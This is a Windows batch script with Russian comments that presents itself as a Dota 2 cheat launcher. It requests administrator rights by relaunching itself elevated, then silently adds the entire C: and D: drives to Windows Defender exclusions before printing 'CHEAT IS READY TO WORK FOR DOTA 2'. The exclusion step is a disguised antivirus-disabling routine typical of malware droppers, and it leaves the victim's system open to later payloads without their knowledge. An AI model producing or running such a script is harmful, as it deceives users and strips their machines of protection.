@echo off
:: Проверка прав администратора
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :is_admin
) else (
    goto :request_admin
)

:is_admin
:: Добавление диска C: в исключения
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1

:: Добавление диска D: в исключения
powershell -Command "Add-MpPreference -ExclusionPath 'D:\'" >nul 2>&1

:: Открытие PowerShell с красным текстом и удержанием окна
powershell -Command "Write-Host 'CHEAT IS READY TO WORK FOR DOTA 2' -ForegroundColor Red; pause"

:: Завершение скрипта
exit

:request_admin
:: Запрос прав администратора
:: Запуск себя от имени администратора через PowerShell
powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
exit